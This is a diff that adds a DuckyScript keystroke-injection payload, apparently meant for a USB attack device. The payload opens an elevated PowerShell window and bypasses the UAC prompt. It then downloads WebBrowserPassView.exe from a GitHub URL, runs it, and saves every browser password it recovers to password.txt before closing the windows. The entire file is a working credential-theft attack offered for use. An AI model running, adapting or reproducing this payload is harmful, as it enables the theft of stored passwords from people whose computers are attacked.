@@ -1,0 +1,52 @@
+GUI r
+DELAY 500
+STRING powershell
+CTRL+SHIFT+ENTER
+DELAY 2000
+ALT + Y
+DELAY 1000
+STRING $Url = "https://github.com/POKER76/TA/raw/main/WebBrowserPassView.exe"; $downloadDir = "C:\Users\Public\Downloads"; $File = " WebBrowserPassView.exe"; Invoke-WebRequest -Uri $Url -OutFile "$downloadDir\$File"; cd $downloadDir ; Start-Process $file -WindowStyle Maximized
+ENTER
+DELAY 5000
+CTRL + A
+DELAY 500
+CTRL + S
+DELAY 700
+SHIFT + TAB
+DELAY 700
+SHIFT + TAB
+DELAY 700
+SHIFT + TAB
+DELAY 700
+SHIFT + TAB
+DELAY 700
+SHIFT + TAB
+DELAY 700
+SHIFT + TAB
+DELAY 700
+ENTER
+DELAY 700
+STRING C:\Users\Public\Downloads
+ENTER
+DELAY 700
+TAB
+DELAY 700
+TAB
+DELAY 700
+TAB
+DELAY 700
+TAB
+DELAY 700
+TAB
+DELAY 700
+TAB
+DELAY 700
+ENTER
+DELAY 700
+STRING password.txt
+ENTER
+DELAY 2000
+ALT+F4
+DELAY 500
+STRING EXIT
+ENTER
